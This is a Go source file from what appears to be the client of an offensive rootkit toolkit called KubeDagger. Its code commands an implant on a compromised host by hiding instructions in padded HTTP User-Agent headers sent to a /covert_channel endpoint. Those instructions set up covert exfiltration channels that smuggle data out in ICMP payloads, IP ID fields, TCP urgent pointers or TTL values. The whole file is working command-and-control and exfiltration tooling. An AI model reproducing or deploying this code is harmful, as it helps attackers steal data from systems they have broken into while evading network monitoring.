package covert_chan

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type ChannelResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, chanType, dest, data, output string) error {
	result := &ChannelResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch chanType {
	case "icmp":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_xdp_icmp", "attach XDP program to craft ICMP echo replies with encoded payload", "covert_icmp_attach"},
			{"encode_payload", "split data into ICMP payload chunks with sequence numbering", "covert_icmp_encode"},
			{"start_exfil", "begin transmitting encoded data via ICMP echo request/reply pairs", "covert_icmp_start"},
		}
	case "ipid":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_tc_egress", "attach TC egress to modify IPv4 Identification field", "covert_ipid_attach"},
			{"configure_encoding", "set 16-bit encoding scheme using IP ID field as carrier", "covert_ipid_config"},
			{"start_channel", "begin encoding data in IP ID field of outgoing packets", "covert_ipid_start"},
		}
	case "urgent":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"hook_tcp_sendmsg", "hook tcp_sendmsg to set URG flag and urgent pointer", "covert_urg_hook"},
			{"encode_urgent", "encode data bytes in TCP urgent pointer field (16-bit channel)", "covert_urg_encode"},
			{"start_channel", "begin sending data via TCP urgent pointer on existing connections", "covert_urg_start"},
		}
	default: // ttl
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"attach_tc_egress", "attach TC program to manipulate IP TTL field", "covert_ttl_attach"},
			{"configure_encoding", "map data bits to TTL decrements (normal variation range)", "covert_ttl_config"},
			{"start_channel", "begin encoding data in TTL field variations of outgoing packets", "covert_ttl_start"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + chanType + "#" + dest + "#" + data
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	d, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, d, 0644)
	}
	fmt.Println(string(d))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/covert_channel", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
